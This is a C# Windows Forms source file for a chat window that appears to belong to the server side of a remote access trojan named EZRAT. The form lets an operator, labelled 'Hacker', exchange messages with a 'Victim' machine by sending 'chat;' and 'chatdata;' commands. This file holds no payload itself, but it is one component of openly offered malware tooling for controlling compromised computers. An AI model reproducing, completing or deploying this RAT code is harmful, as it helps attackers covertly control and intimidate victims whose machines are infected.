using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EZRATServer.Forms
{
    public partial class Chat : Form
    {

        private List<string> _texted = new List<string>();

        public List<string> Texted
        {
            get { return _texted; }
            set { _texted = value; }
        }

        private string _serverName;

        public string ServerName
        {
            get { return _serverName + " : "; }
            set { _serverName = value; }
        }

        private string _victimName;

        public string VictimName
        {
            get { return _victimName + " : "; }
            set { _victimName = value; }
        }

        private int _id;

        public int Id
        {
            get { return _id; }
            set { _id = value; }
        }


        private Server _parent;


        public Chat(Server parent, int id, string message = "")
        {
            this._parent = parent;
            this.Id = id;
            InitializeComponent();
            this.btnSend.Click += SendMessageChat;
            this.btnGet.Click += GetAllData;
            this.Text = "Chat";
            this.VictimName = "Hacker";
            this.ServerName = "Victim";
            if (message != "")
            {
                this.Texted.Add(this.ServerName + message);
                this.rtbMsg.Text += this.ServerName + message + Environment.NewLine;
            }
        }

        private void GetAllData(object sender, EventArgs e)
        {
            this._parent.SendCommand("chatdata;", this.Id);
        }

        public void UpdateAllData(string[] lstMsg)
        {
            for (int i = 0; i < lstMsg.Length; i++)
            {
                AddBruteMessage(lstMsg[i]);
            }
        }

        private void SendMessageChat(object sender, EventArgs e)
        {
            string msg = string.Empty;
            this.tbxMsg.Invoke(new MethodInvoker(() => msg = this.tbxMsg.Text));
            this.tbxMsg.Invoke(new MethodInvoker(() => this.tbxMsg.Text = string.Empty));
            this._parent.SendCommand("chat;" + msg, this.Id);
            this.Texted.Add(this.VictimName + msg);
            AddMessage(msg, 1);
        }


        public void NewMessage(string message)
        {
            this.Texted.Add(this.ServerName + message + Environment.NewLine);
            AddMessage(message, 0);
        }


        private void AddMessage(string message, int user)
        {
            if (this.rtbMsg.InvokeRequired)
            {
                this.rtbMsg.Invoke(new MethodInvoker(() => this.rtbMsg.Text += ((user == 0) ? this.ServerName : this.VictimName) + message + Environment.NewLine));
            }
            else
            {
                this.rtbMsg.Text += ((user == 0) ? this.ServerName : this.VictimName) + message + Environment.NewLine;
            }
        }

        private void AddBruteMessage(string message)
        {
            if (this.rtbMsg.InvokeRequired)
            {
                this.rtbMsg.Invoke(new MethodInvoker(() => this.rtbMsg.Text += message + Environment.NewLine));
            }
            else
            {
                this.rtbMsg.Text += message + Environment.NewLine;
            }
        }
    }
}
